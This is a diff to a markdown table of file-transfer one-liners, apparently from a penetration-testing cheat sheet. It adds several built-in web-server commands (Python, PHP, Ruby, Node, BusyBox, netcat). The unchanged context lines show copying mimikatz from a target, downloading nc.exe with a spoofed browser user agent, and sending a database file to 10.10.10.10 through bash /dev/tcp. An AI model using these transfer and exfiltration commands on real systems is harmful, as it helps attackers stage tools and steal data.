@@ -20,3 +20,10 @@ order: 3
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
 | `nc -lvnp 8888 > file.db`<br>`cat file.db > /dev/tcp/10.10.10.10/8888` | Transfer a file using Netcat and bash TCP socket |
+| `python -m http.server 1234`              | Python 3 built‑in static file server on port 1234       |
+| `python -m SimpleHTTPServer 8000`         | Python 2 built‑in static file server on port 8000       |
+| `php -S 0.0.0.0:1234`                     | PHP built‑in web server on port 1234                    |
+| `ruby -run -e httpd . -p 1234`            | Ruby one‑liner HTTP server on port 1234                 |
+| `npx http-server . -p 1234`               | Node.js “http-server” (via npx) on port 1234            |
+| `busybox httpd -f -p 1234`                | BusyBox embedded HTTP server on port 1234               |
+| `nc -l 1234 < index.html`                 | Simple one‑file serve via netcat on port 1234           |
